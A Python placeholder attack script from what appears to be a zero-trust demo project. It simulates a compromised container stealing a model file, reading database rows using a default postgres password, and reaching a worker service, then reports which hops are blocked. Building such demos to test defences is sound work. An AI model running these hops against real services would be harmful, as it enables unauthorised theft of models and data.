"""
attack/attack.py
-----------------
PLACEHOLDER. Sreelakshmi owns this file for real (the hash-proof against
model-store's own hash, the stolen-token replay hop, evidence capture).
This version exists so Abubakar can prove make baseline / make zt work
end to end today, without waiting on anyone else. It already follows her
required output format so swapping in her real script changes nothing
else in the project (compose files, Makefile stay the same).

Runs the same three hops, unmodified, against whichever mode's compose
file brought it up:
  1. steal the model file from model-store
  2. read the database directly
  3. reach the worker sideways
"""
import os
import time
import hashlib

import requests

MODEL_STORE_URL = os.environ.get("MODEL_STORE_URL", "http://model-store:8080")
WORKER_URL = os.environ.get("WORKER_URL", "http://worker:8080")
MODEL_NAME = "llama-guard.bin"

hops_attempted = 0
hops_succeeded = 0


def hop1_steal_model():
    global hops_attempted, hops_succeeded
    hops_attempted += 1
    url = f"{MODEL_STORE_URL}/models/{MODEL_NAME}"
    try:
        resp = requests.get(url, timeout=5)
    except requests.RequestException as e:
        print(f"[HOP 1] model-store GET /models/{MODEL_NAME} -> BLOCKED {e}")
        return

    if resp.status_code == 200:
        digest = hashlib.sha256(resp.content).hexdigest()
        size_mb = len(resp.content) / (1024 * 1024)
        print(
            f"[HOP 1] model-store GET /models/{MODEL_NAME} -> 200 OK "
            f"STOLEN sha256={digest} ({size_mb:.1f} MB)"
        )
        hops_succeeded += 1
    else:
        print(
            f"[HOP 1] model-store GET /models/{MODEL_NAME} -> "
            f"{resp.status_code} DENIED body={resp.text[:200]}"
        )


def hop2_read_db():
    global hops_attempted, hops_succeeded
    hops_attempted += 1
    try:
        import psycopg2
    except ImportError:
        print("[HOP 2] postgres SELECT inference_logs -> ERROR psycopg2 not installed")
        return

    host = os.environ.get("DB_HOST", "db")
    dbname = os.environ.get("DB_NAME", "ztdemo")
    password = os.environ.get("DB_PASSWORD", "demo")

    try:
        conn = psycopg2.connect(
            host=host, dbname=dbname, user="postgres", password=password, connect_timeout=3
        )
        cur = conn.cursor()
        cur.execute("SELECT * FROM inference_logs LIMIT 5")
        rows = cur.fetchall()
        print(f"[HOP 2] postgres SELECT inference_logs -> {len(rows)} rows LEAKED")
        for r in rows:
            print(f"         {r}")
        hops_succeeded += 1
        cur.close()
        conn.close()
    except Exception as e:
        print(f"[HOP 2] postgres SELECT inference_logs -> BLOCKED {e}")


def hop3_reach_worker():
    global hops_attempted, hops_succeeded
    hops_attempted += 1
    url = f"{WORKER_URL}/run"
    try:
        resp = requests.post(url, json={"junk": "input"}, timeout=5)
    except requests.RequestException as e:
        print(f"[HOP 3] worker POST /run -> BLOCKED {e}")
        return

    if resp.status_code == 200:
        print("[HOP 3] worker POST /run -> 200 OK REACHED")
        hops_succeeded += 1
    else:
        print(f"[HOP 3] worker POST /run -> {resp.status_code} DENIED body={resp.text[:200]}")


if __name__ == "__main__":
    print("=== Attack script: pretending to be a container the attacker already owns ===")
    time.sleep(1)
    hop1_steal_model()
    hop2_read_db()
    hop3_reach_worker()
    print(f"hops_attempted={hops_attempted} hops_succeeded={hops_succeeded}")
